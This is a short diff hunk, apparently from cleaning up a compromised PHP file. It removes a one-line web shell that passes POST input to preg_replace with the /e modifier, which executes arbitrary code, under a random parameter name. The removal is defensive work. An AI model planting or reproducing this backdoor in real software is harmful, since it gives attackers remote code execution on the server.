@@ -1,5 +1,4 @@
-<?php @preg_replace('/(.*)/e', @$_POST['tmckfqzgmujfsvmx'], '');
-
+<?php
 
 /**
  * @file
